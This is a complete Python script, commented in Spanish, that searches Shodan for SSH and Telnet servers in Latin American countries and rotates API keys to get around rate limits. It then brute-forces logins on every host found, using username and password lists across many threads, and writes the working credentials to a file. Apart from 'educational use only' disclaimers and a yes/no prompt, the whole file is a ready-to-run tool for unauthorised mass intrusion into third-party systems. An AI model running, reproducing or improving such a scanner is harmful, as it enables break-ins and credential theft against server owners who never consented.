#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Script para validación de credenciales SSH y Telnet usando Shodan API
Desarrollado con fines exclusivamente educativos y académicos
Autor: [Tu Nombre]
Fecha: Abril 2024

USO ÉTICO Y LEGAL:
Esta herramienta es EXCLUSIVAMENTE para fines académicos y educativos.
El uso debe ser responsable, ético y legal. El usuario asume toda la
responsabilidad legal ante cualquier uso indebido de esta aplicación.
"""

import os
import sys
import time
import socket
import logging
import argparse
import json
import random
import csv
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Tuple, Any, Optional, Union

# Bibliotecas para conectividad
import paramiko
import telnetlib

# API de Shodan
import shodan

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ssh_telnet_validator.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Países de Latinoamérica con sus códigos ISO
LATAM_COUNTRIES = {
    'Argentina': 'AR', 'Bolivia': 'BO', 'Brasil': 'BR', 'Chile': 'CL',
    'Colombia': 'CO', 'Costa Rica': 'CR', 'Cuba': 'CU', 'Ecuador': 'EC',
    'El Salvador': 'SV', 'Guatemala': 'GT', 'Haití': 'HT', 'Honduras': 'HN',
    'México': 'MX', 'Nicaragua': 'NI', 'Panamá': 'PA', 'Paraguay': 'PY',
    'Perú': 'PE', 'República Dominicana': 'DO', 'Uruguay': 'UY', 'Venezuela': 'VE'
}

class ShodanScanner:
    """Clase para manejar la búsqueda de servicios usando Shodan API"""
    
    def __init__(self, api_keys: List[str], max_results: int = 100):
        """
        Inicializa el escáner de Shodan
        
        Args:
            api_keys: Lista de claves API de Shodan para rotación
            max_results: Número máximo de resultados a obtener
        """
        self.api_keys = api_keys
        self.current_key_index = 0
        self.api = None
        self.max_results = max_results
        self._initialize_api()
        
    def _initialize_api(self) -> None:
        """Inicializa la API de Shodan con la clave actual"""
        if not self.api_keys:
            raise ValueError("No se proporcionaron claves API de Shodan")
        
        self.api = shodan.Shodan(self.api_keys[self.current_key_index])
        logger.info(f"API de Shodan inicializada con la clave #{self.current_key_index + 1}")
    
    def _rotate_api_key(self) -> None:
        """Rota a la siguiente clave API si está disponible"""
        self.current_key_index = (self.current_key_index + 1) % len(self.api_keys)
        self._initialize_api()
        logger.info(f"Rotando a la clave API #{self.current_key_index + 1}")
    
    def search_services(self, service: str, country_codes: List[str], port: Optional[int] = None) -> List[Dict]:
        """
        Busca servicios específicos en países definidos
        
        Args:
            service: Servicio a buscar ('ssh' o 'telnet')
            country_codes: Lista de códigos de país ISO
            port: Puerto específico a buscar (opcional)
        
        Returns:
            Lista de resultados con IP, puerto y banner
        """
        results = []
        query_parts = [f"{service}"]
        
        # Añadir países a la consulta
        country_filter = " OR ".join([f"country:{code}" for code in country_codes])
        if country_filter:
            query_parts.append(f"({country_filter})")
        
        # Añadir puerto específico si se proporciona
        if port is not None:
            query_parts.append(f"port:{port}")
        
        query = " ".join(query_parts)
        logger.info(f"Ejecutando búsqueda Shodan: {query}")
        
        try:
            search_results = []
            for attempt in range(len(self.api_keys)):
                try:
                    # Intenta obtener resultados con la clave API actual
                    search_results = self.api.search(query, limit=self.max_results)
                    break
                except shodan.APIError as e:
                    if "API key" in str(e) or "rate limit" in str(e).lower():
                        logger.warning(f"Error con la clave API actual: {str(e)}")
                        if attempt < len(self.api_keys) - 1:
                            self._rotate_api_key()
                            time.sleep(1)  # Pequeña pausa antes de intentar con otra clave
                        else:
                            logger.error("Todas las claves API han fallado")
                            raise
                    else:
                        raise
            
            # Procesar resultados
            for item in search_results.get('matches', []):
                ip = item.get('ip_str')
                found_port = item.get('port')
                banner = item.get('data', '')
                country = item.get('location', {}).get('country_name', 'Desconocido')
                
                results.append({
                    'ip': ip,
                    'port': found_port,
                    'banner': banner[:100] if banner else '',  # Truncar banner para legibilidad
                    'country': country
                })
                
            logger.info(f"Se encontraron {len(results)} resultados para {service}")
            return results
            
        except shodan.APIError as e:
            logger.error(f"Error en la API de Shodan: {str(e)}")
            return []
        except Exception as e:
            logger.error(f"Error inesperado en la búsqueda: {str(e)}")
            return []


class CredentialValidator:
    """Clase para validar credenciales SSH y Telnet"""
    
    def __init__(self, timeout: int = 5):
        """
        Inicializa el validador de credenciales
        
        Args:
            timeout: Timeout para conexiones en segundos
        """
        self.timeout = timeout
        self.valid_credentials = []
    
    def check_port_open(self, ip: str, port: int) -> bool:
        """
        Verifica si un puerto está abierto en la IP especificada
        
        Args:
            ip: Dirección IP a verificar
            port: Puerto a verificar
        
        Returns:
            True si el puerto está abierto, False en caso contrario
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception as e:
            logger.debug(f"Error al verificar puerto {port} en {ip}: {str(e)}")
            return False
    
    def validate_ssh(self, ip: str, port: int, username: str, password: str) -> bool:
        """
        Intenta autenticarse en un servidor SSH
        
        Args:
            ip: Dirección IP del servidor
            port: Puerto SSH
            username: Nombre de usuario
            password: Contraseña
        
        Returns:
            True si la autenticación fue exitosa, False en caso contrario
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(
                ip,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )
            # Si llegamos aquí, la autenticación fue exitosa
            client.close()
            credential = {
                'ip': ip,
                'port': port,
                'protocol': 'SSH',
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat()
            }
            self.valid_credentials.append(credential)
            logger.info(f"[+] Credencial SSH válida encontrada: {ip}:{port} - {username}:{password}")
            return True
        except paramiko.AuthenticationException:
            logger.debug(f"[-] Autenticación SSH fallida: {ip}:{port} - {username}:{password}")
            return False
        except (paramiko.SSHException, socket.error) as e:
            logger.debug(f"[-] Error de conexión SSH a {ip}:{port}: {str(e)}")
            return False
        except Exception as e:
            logger.debug(f"[-] Error inesperado SSH a {ip}:{port}: {str(e)}")
            return False
    
    def validate_telnet(self, ip: str, port: int, username: str, password: str) -> bool:
        """
        Intenta autenticarse en un servidor Telnet
        
        Args:
            ip: Dirección IP del servidor
            port: Puerto Telnet
            username: Nombre de usuario
            password: Contraseña
        
        Returns:
            True si la autenticación fue exitosa, False en caso contrario
        """
        try:
            tn = telnetlib.Telnet(ip, port, timeout=self.timeout)
            
            # Esperar prompt de usuario
            resp = tn.read_until(b"login:", timeout=self.timeout)
            tn.write(username.encode('ascii') + b"\n")
            
            # Esperar prompt de contraseña
            resp = tn.read_until(b"Password:", timeout=self.timeout)
            tn.write(password.encode('ascii') + b"\n")
            
            # Leer respuesta para ver si entramos
            resp = tn.read_until(b"$", timeout=self.timeout)
            
            # Verificar si la autenticación fue exitosa (buscar indicadores de éxito/fallo)
            # Esto puede variar según el sistema, esta es una comprobación genérica
            if b"incorrect" in resp.lower() or b"failed" in resp.lower() or b"invalid" in resp.lower():
                logger.debug(f"[-] Autenticación Telnet fallida: {ip}:{port} - {username}:{password}")
                tn.close()
                return False
            
            tn.close()
            credential = {
                'ip': ip,
                'port': port,
                'protocol': 'Telnet',
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat()
            }
            self.valid_credentials.append(credential)
            logger.info(f"[+] Credencial Telnet válida encontrada: {ip}:{port} - {username}:{password}")
            return True
        except EOFError:
            logger.debug(f"[-] Conexión Telnet cerrada por el servidor: {ip}:{port}")
            return False
        except socket.timeout:
            logger.debug(f"[-] Timeout en conexión Telnet a {ip}:{port}")
            return False
        except ConnectionRefusedError:
            logger.debug(f"[-] Conexión Telnet rechazada: {ip}:{port}")
            return False
        except Exception as e:
            logger.debug(f"[-] Error inesperado Telnet a {ip}:{port}: {str(e)}")
            return False
    
    def save_valid_credentials(self, filename: str = "valid_credentials.json") -> None:
        """
        Guarda las credenciales válidas encontradas en un archivo
        
        Args:
            filename: Nombre del archivo para guardar las credenciales
        """
        if not self.valid_credentials:
            logger.info("No se encontraron credenciales válidas para guardar")
            return
        
        try:
            with open(filename, 'w') as f:
                json.dump(self.valid_credentials, f, indent=4)
            logger.info(f"Credenciales válidas guardadas en {filename}")
        except Exception as e:
            logger.error(f"Error al guardar credenciales: {str(e)}")


class FileManager:
    """Clase para manejar la carga y gestión de archivos"""
    
    @staticmethod
    def load_txt_file(filename: str) -> List[str]:
        """
        Carga datos de un archivo de texto, una entrada por línea
        
        Args:
            filename: Ruta al archivo
        
        Returns:
            Lista de líneas no vacías del archivo
        """
        try:
            if not os.path.exists(filename):
                logger.error(f"Archivo no encontrado: {filename}")
                return []
            
            with open(filename, 'r') as f:
                lines = [line.strip() for line in f.readlines()]
                return [line for line in lines if line]  # Filtrar líneas vacías
        except Exception as e:
            logger.error(f"Error al cargar el archivo {filename}: {str(e)}")
            return []
    
    @staticmethod
    def save_results_to_csv(data: List[Dict], filename: str) -> None:
        """
        Guarda resultados en formato CSV
        
        Args:
            data: Lista de diccionarios con los datos a guardar
            filename: Nombre del archivo CSV
        """
        if not data:
            logger.info(f"No hay datos para guardar en {filename}")
            return
        
        try:
            with open(filename, 'w', newline='') as csvfile:
                if not data:
                    logger.warning(f"No hay datos para escribir en {filename}")
                    return
                
                fieldnames = data[0].keys()
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                for row in data:
                    writer.writerow(row)
                
            logger.info(f"Datos guardados en {filename}")
        except Exception as e:
            logger.error(f"Error al guardar en CSV {filename}: {str(e)}")


class ReportGenerator:
    """Clase para generar reportes estadísticos"""
    
    @staticmethod
    def generate_port_stats(results: List[Dict]) -> Dict:
        """
        Genera estadísticas sobre puertos encontrados
        
        Args:
            results: Lista de resultados de escaneo
        
        Returns:
            Diccionario con estadísticas
        """
        if not results:
            return {"total": 0, "ports": {}}
        
        port_count = {}
        for result in results:
            port = result.get('port')
            if port:
                port_count[port] = port_count.get(port, 0) + 1
        
        stats = {
            "total": len(results),
            "ports": {str(port): {"count": count, "percentage": (count / len(results)) * 100}
                     for port, count in port_count.items()}
        }
        return stats
    
    @staticmethod
    def generate_country_stats(results: List[Dict]) -> Dict:
        """
        Genera estadísticas por país
        
        Args:
            results: Lista de resultados de escaneo
        
        Returns:
            Diccionario con estadísticas por país
        """
        if not results:
            return {"total": 0, "countries": {}}
        
        country_count = {}
        for result in results:
            country = result.get('country', 'Desconocido')
            country_count[country] = country_count.get(country, 0) + 1
        
        stats = {
            "total": len(results),
            "countries": {country: {"count": count, "percentage": (count / len(results)) * 100}
                         for country, count in country_count.items()}
        }
        return stats
    
    @staticmethod
    def generate_validation_stats(total_ips: int, accessible_ips: int, valid_credentials: int) -> Dict:
        """
        Genera estadísticas de validación
        
        Args:
            total_ips: Total de IPs escaneadas
            accessible_ips: Número de IPs accesibles
            valid_credentials: Número de credenciales válidas encontradas
        
        Returns:
            Diccionario con estadísticas de validación
        """
        if total_ips == 0:
            return {
                "total_ips": 0,
                "accessible_percentage": 0,
                "valid_credentials": 0,
                "success_rate": 0
            }
        
        stats = {
            "total_ips": total_ips,
            "accessible_ips": accessible_ips,
            "accessible_percentage": (accessible_ips / total_ips) * 100 if total_ips > 0 else 0,
            "valid_credentials": valid_credentials,
            "success_rate": (valid_credentials / accessible_ips) * 100 if accessible_ips > 0 else 0
        }
        return stats


class SSHTelnetValidator:
    """Clase principal que coordina la validación de credenciales SSH y Telnet"""
    
    def __init__(self, args: argparse.Namespace):
        """
        Inicializa el validador con los argumentos de línea de comandos
        
        Args:
            args: Argumentos de línea de comandos parseados
        """
        self.args = args
        self.file_manager = FileManager()
        
        # Cargar API keys de Shodan
        self.api_keys = self.file_manager.load_txt_file(args.api_keys_file)
        if not self.api_keys:
            logger.error("No se pudieron cargar las claves API de Shodan")
            raise ValueError("Se requiere al menos una clave API de Shodan")
        
        # Inicializar componentes
        self.scanner = ShodanScanner(self.api_keys, max_results=args.max_results)
        self.validator = CredentialValidator(timeout=args.timeout)
        
        # Estadísticas
        self.stats = {
            "ssh_results": [],
            "telnet_results": [],
            "accessible_ips": 0,
            "valid_credentials": 0
        }
    
    def load_data(self) -> Tuple[List[str], List[str], List[str]]:
        """
        Carga las listas de IPs, usuarios y contraseñas desde archivos
        
        Returns:
            Tupla con listas de IPs, usuarios y contraseñas
        """
        # Cargar IPs, usuarios y contraseñas si se proporcionaron archivos
        ips = []
        if self.args.ip_file:
            ips = self.file_manager.load_txt_file(self.args.ip_file)
            logger.info(f"Cargadas {len(ips)} IPs desde {self.args.ip_file}")
        
        usernames = self.file_manager.load_txt_file(self.args.username_file)
        if not usernames:
            logger.warning(f"No se pudieron cargar nombres de usuario desde {self.args.username_file}")
            usernames = ["admin", "root", "user"]  # Valores predeterminados
        logger.info(f"Cargados {len(usernames)} nombres de usuario")
        
        passwords = self.file_manager.load_txt_file(self.args.password_file)
        if not passwords:
            logger.warning(f"No se pudieron cargar contraseñas desde {self.args.password_file}")
            passwords = ["admin", "password", "12345"]  # Valores predeterminados
        logger.info(f"Cargadas {len(passwords)} contraseñas")
        
        return ips, usernames, passwords
    
    def search_services(self) -> Tuple[List[Dict], List[Dict]]:
        """
        Busca servicios SSH y Telnet usando Shodan
        
        Returns:
            Tupla con resultados SSH y Telnet
        """
        # Convertir nombres de países a códigos ISO
        country_codes = []
        if self.args.countries:
            for country in self.args.countries:
                if country.upper() in [code.upper() for code in LATAM_COUNTRIES.values()]:
                    country_codes.append(country.upper())
                elif country in LATAM_COUNTRIES:
                    country_codes.append(LATAM_COUNTRIES[country])
                else:
                    logger.warning(f"País no reconocido: {country}")
        
        # Si no se especificaron países, usar todos los de LATAM
        if not country_codes:
            country_codes = list(LATAM_COUNTRIES.values())
            logger.info("Usando todos los países de Latinoamérica para la búsqueda")
        
        # Buscar servicios SSH
        ssh_results = []
        if not self.args.skip_ssh:
            ssh_results = self.scanner.search_services('ssh', country_codes, self.args.ssh_port)
            self.stats["ssh_results"] = ssh_results
            logger.info(f"Encontrados {len(ssh_results)} servicios SSH")
        
        # Buscar servicios Telnet
        telnet_results = []
        if not self.args.skip_telnet:
            telnet_results = self.scanner.search_services('telnet', country_codes, self.args.telnet_port)
            self.stats["telnet_results"] = telnet_results
            logger.info(f"Encontrados {len(telnet_results)} servicios Telnet")
        
        return ssh_results, telnet_results
    
    def validate_services(self, ips: List[str], usernames: List[str], passwords: List[str], 
                         ssh_results: List[Dict], telnet_results: List[Dict]) -> None:
        """
        Valida servicios SSH y Telnet
        
        Args:
            ips: Lista de IPs adicionales a validar
            usernames: Lista de nombres de usuario
            passwords: Lista de contraseñas
            ssh_results: Resultados de búsqueda SSH
            telnet_results: Resultados de búsqueda Telnet
        """
        # Combinar IPs de Shodan con IPs adicionales
        combined_ssh_ips = [(result['ip'], result['port']) for result in ssh_results]
        combined_telnet_ips = [(result['ip'], result['port']) for result in telnet_results]
        
        # Añadir IPs adicionales con puertos predeterminados
        if ips:
            if not self.args.skip_ssh:
                combined_ssh_ips.extend([(ip, self.args.ssh_port) for ip in ips])
            if not self.args.skip_telnet:
                combined_telnet_ips.extend([(ip, self.args.telnet_port) for ip in ips])
        
        # Eliminar duplicados
        combined_ssh_ips = list(set(combined_ssh_ips))
        combined_telnet_ips = list(set(combined_telnet_ips))
        
        # Verificar puertos abiertos
        accessible_ssh_ips = []
        accessible_telnet_ips = []
        
        logger.info("Verificando accesibilidad de puertos...")
        
        # Verificar puertos SSH
        if combined_ssh_ips and not self.args.skip_port_check:
            for ip, port in combined_ssh_ips:
                if self.validator.check_port_open(ip, port):
                    accessible_ssh_ips.append((ip, port))
                    logger.debug(f"Puerto SSH {port} abierto en {ip}")
        else:
            # Si se omitió la verificación, considerar todos como accesibles
            accessible_ssh_ips = combined_ssh_ips
        
        # Verificar puertos Telnet
        if combined_telnet_ips and not self.args.skip_port_check:
            for ip, port in combined_telnet_ips:
                if self.validator.check_port_open(ip, port):
                    accessible_telnet_ips.append((ip, port))
                    logger.debug(f"Puerto Telnet {port} abierto en {ip}")
        else:
            # Si se omitió la verificación, considerar todos como accesibles
            accessible_telnet_ips = combined_telnet_ips
        
        self.stats["accessible_ips"] = len(accessible_ssh_ips) + len(accessible_telnet_ips)
        
        logger.info(f"IPs SSH accesibles: {len(accessible_ssh_ips)}")
        logger.info(f"IPs Telnet accesibles: {len(accessible_telnet_ips)}")
        
        # Validar credenciales si se solicitó
        if self.args.validate_credentials:
            self._validate_credentials(accessible_ssh_ips, accessible_telnet_ips, usernames, passwords)
    
    def _validate_credentials(self, ssh_ips: List[Tuple[str, int]], telnet_ips: List[Tuple[str, int]], 
                             usernames: List[str], passwords: List[str]) -> None:
        """
        Valida credenciales en IPs accesibles
        
        Args:
            ssh_ips: Lista de tuplas (IP, puerto) SSH
            telnet_ips: Lista de tuplas (IP, puerto) Telnet
            usernames: Lista de nombres de usuario
            passwords: Lista de contraseñas
        """
        logger.info("Iniciando validación de credenciales...")
        
        # Limitar el número de combinaciones para evitar escaneos excesivos
        if self.args.max_cred_attempts > 0:
            max_attempts = self.args.max_cred_attempts
            logger.info(f"Limitando a {max_attempts} intentos de credenciales por servicio")
            
            # Reducir combinaciones si es necesario
            if len(usernames) * len(passwords) > max_attempts:
                # Seleccionar un subconjunto aleatorio de combinaciones
                combinations = []
                while len(combinations) < max_attempts:
                    user = random.choice(usernames)
                    pwd = random.choice(passwords)
                    if (user, pwd) not in combinations:
                        combinations.append((user, pwd))
            else:
                combinations = [(user, pwd) for user in usernames for pwd in passwords]
        else:
            combinations = [(user, pwd) for user in usernames for pwd in passwords]
        
        logger.info(f"Se probarán {len(combinations)} combinaciones de credenciales")
        
        # Validar SSH
        if ssh_ips and not self.args.skip_ssh:
            with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
                for ip, port in ssh_ips:
                    for username, password in combinations:
                        executor.submit(self.validator.validate_ssh, ip, port, username, password)
        
        # Validar Telnet
        if telnet_ips and not self.args.skip_telnet:
            with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
                for ip, port in telnet_ips:
                    for username, password in combinations:
                        executor.submit(self.validator.validate_telnet, ip, port, username, password)
        
        # Actualizar estadísticas
        self.stats["valid_credentials"] = len(self.validator.valid_credentials)
        logger.info(f"Se encontraron {self.stats['valid_credentials']} credenciales válidas")
        
        # Guardar credenciales válidas
        self.validator.save_valid_credentials(self.args.output_creds)
    
    def generate_reports(self) -> None:
        """Genera reportes estadísticos"""
        logger.info("Generando reportes estadísticos...")
        
        # Generar estadísticas
        ssh_port_stats = ReportGenerator.generate_port_stats(self.stats["ssh_results"])
        telnet_port_stats = ReportGenerator.generate_port_stats(self.stats["telnet_results"])
        
        ssh_country_stats = ReportGenerator.generate_country_stats(self.stats["ssh_results"])
        telnet_country_stats = ReportGenerator.generate_country_stats(self.stats["telnet_results"])
        
        validation_stats = ReportGenerator.generate_validation_stats(
            len(self.stats["ssh_results"]) + len(self.stats["telnet_results"]),
            self.stats["accessible_ips"],
            self.stats["valid_credentials"]
        )
        
        # Crear informe completo
        report = {
            "timestamp": datetime.now().isoformat(),
            "scan_info": {
                "ssh_enabled": not self.args.skip_ssh,
                "telnet_enabled": not self.args.skip_telnet,
                "credential_validation": self.args.validate_credentials,
                "port_check_enabled": not self.args.skip_port_check
            },
            "ssh_stats": {
                "port_distribution": ssh_port_stats,
                "country_distribution": ssh_country_stats
            },
            "telnet_stats": {
                "port_distribution": telnet_port_stats,
                "country_distribution": telnet_country_stats
            },
            "validation_stats": validation_stats
        }
        
        # Guardar informe en formato JSON
        try:
            with open(self.args.output_report, 'w') as f:
                json.dump(report, f, indent=4)
            logger.info(f"Informe guardado en {self.args.output_report}")
        except Exception as e:
            logger.error(f"Error al guardar el informe: {str(e)}")
        
        # Mostrar resumen en consola
        self._print_summary(validation_stats)
    
    def _print_summary(self, validation_stats: Dict) -> None:
        """
        Imprime un resumen de los resultados
        
        Args:
            validation_stats: Estadísticas de validación
        """
        print("\n" + "=" * 60)
        print(" RESUMEN DE RESULTADOS ".center(60, "="))
        print("=" * 60)
        
        print(f"\nServicios encontrados:")
        print(f"  - SSH: {len(self.stats['ssh_results'])}")
        print(f"  - Telnet: {len(self.stats['telnet_results'])}")
        
        print(f"\nIPs accesibles: {validation_stats['accessible_ips']} de {validation_stats['total_ips']}")
        print(f"Porcentaje accesible: {validation_stats['accessible_percentage']:.2f}%")
        
        if self.args.validate_credentials:
            print(f"\nCredenciales válidas encontradas: {validation_stats['valid_credentials']}")
            print(f"Tasa de éxito: {validation_stats['success_rate']:.2f}%")
            print(f"Detalles guardados en: {self.args.output_creds}")
        
        print(f"\nInforme completo guardado en: {self.args.output_report}")
        print("\n" + "=" * 60 + "\n")
    
    def run(self) -> None:
        """Ejecuta la validación completa"""
        print("\n" + "=" * 60)
        print(" VALIDADOR DE CREDENCIALES SSH/TELNET ".center(60, "="))
        print(" PARA FINES EDUCATIVOS ÚNICAMENTE ".center(60, "="))
        print("=" * 60 + "\n")
        
        try:
            # Cargar datos
            ips, usernames, passwords = self.load_data()
            
            # Buscar servicios
            ssh_results, telnet_results = self.search_services()
            
            # Validar servicios
            self.validate_services(ips, usernames, passwords, ssh_results, telnet_results)
            
            # Generar reportes
            self.generate_reports()
            
            logger.info("Proceso completado exitosamente")
        except KeyboardInterrupt:
            logger.warning("Proceso interrumpido por el usuario")
            # Guardar datos parciales si es posible
            if hasattr(self, 'validator') and self.validator.valid_credentials:
                self.validator.save_valid_credentials(self.args.output_creds)
            print("\nProceso interrumpido. Se han guardado los datos parciales.")
        except Exception as e:
            logger.error(f"Error en la ejecución: {str(e)}")
            print(f"\nError: {str(e)}")


def parse_args() -> argparse.Namespace:
    """
    Parsea los argumentos de línea de comandos
    
    Returns:
        Namespace con los argumentos parseados
    """
    parser = argparse.ArgumentParser(
        description="Validador de credenciales SSH y Telnet usando Shodan API (SOLO PARA FINES EDUCATIVOS)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # Archivos de entrada
    parser.add_argument("-k", "--api-keys-file", required=True,
                        help="Archivo con claves API de Shodan (una por línea)")
    parser.add_argument("-i", "--ip-file", 
                        help="Archivo con IPs adicionales a probar (una por línea)")
    parser.add_argument("-u", "--username-file", required=True,
                        help="Archivo con nombres de usuario a probar (uno por línea)")
    parser.add_argument("-p", "--password-file", required=True,
                        help="Archivo con contraseñas a probar (una por línea)")
    
    # Opciones de búsqueda
    parser.add_argument("-c", "--countries", nargs="+",
                        help="Países específicos de Latinoamérica a buscar (nombre o código ISO)")
    parser.add_argument("-m", "--max-results", type=int, default=100,
                        help="Número máximo de resultados a obtener de Shodan")
    parser.add_argument("--ssh-port", type=int, default=22,
                        help="Puerto SSH personalizado para búsqueda y validación")
    parser.add_argument("--telnet-port", type=int, default=23,
                        help="Puerto Telnet personalizado para búsqueda y validación")
    
    # Opciones de validación
    parser.add_argument("--skip-ssh", action="store_true",
                        help="Omitir la búsqueda y validación de SSH")
    parser.add_argument("--skip-telnet", action="store_true",
                        help="Omitir la búsqueda y validación de Telnet")
    parser.add_argument("--skip-port-check", action="store_true",
                        help="Omitir la verificación de puerto abierto")
    parser.add_argument("--validate-credentials", action="store_true",
                        help="Realizar validación de credenciales")
    parser.add_argument("--timeout", type=int, default=5,
                        help="Timeout para conexiones en segundos")
    parser.add_argument("--threads", type=int, default=10,
                        help="Número de hilos para validación paralela")
    parser.add_argument("--max-cred-attempts", type=int, default=50,
                        help="Máximo de combinaciones de credenciales a probar por servicio (0 = sin límite)")
    
    # Archivos de salida
    parser.add_argument("--output-creds", default="valid_credentials.json",
                        help="Archivo para guardar credenciales válidas")
    parser.add_argument("--output-report", default="scan_report.json",
                        help="Archivo para guardar el informe de escaneo")
    
    return parser.parse_args()


def main() -> None:
    """Función principal del programa"""
    # Mostrar banner
    print("""
    ███████╗███████╗██╗  ██╗    ████████╗███████╗██╗     ███╗   ██╗███████╗████████╗
    ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██╔════╝██║     ████╗  ██║██╔════╝╚══██╔══╝
    ███████╗███████╗███████║       ██║   █████╗  ██║     ██╔██╗ ██║█████╗     ██║   
    ╚════██║╚════██║██╔══██║       ██║   ██╔══╝  ██║     ██║╚██╗██║██╔══╝     ██║   
    ███████║███████║██║  ██║       ██║   ███████╗███████╗██║ ╚████║███████╗   ██║   
    ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   
    
                       VALIDADOR DE CREDENCIALES SSH/TELNET
                         EXCLUSIVAMENTE PARA FINES EDUCATIVOS
                         
                         Desarrollado con fines exclusivamente 
                             académicos y educativos.
    """)
    
    # Advertencia ética y legal
    print("""
    ⚠️  AVISO IMPORTANTE ⚠️
    Esta herramienta es EXCLUSIVAMENTE para fines académicos y educativos.
    El uso debe ser responsable, ético y legal. El usuario asume toda la
    responsabilidad legal ante cualquier uso indebido de esta aplicación.
    """)
    
    confirmation = input("\n¿Confirma que usará esta herramienta solo para fines educativos? (s/n): ")
    if confirmation.lower() not in ['s', 'si', 'sí', 'y', 'yes']:
        print("Operación cancelada por el usuario.")
        sys.exit(0)
    
    try:
        # Parsear argumentos
        args = parse_args()
        
        # Crear y ejecutar el validador
        validator = SSHTelnetValidator(args)
        validator.run()
    except KeyboardInterrupt:
        print("\nOperación cancelada por el usuario.")
    except Exception as e:
        print(f"\nError: {str(e)}")
        logger.error(f"Error no controlado: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
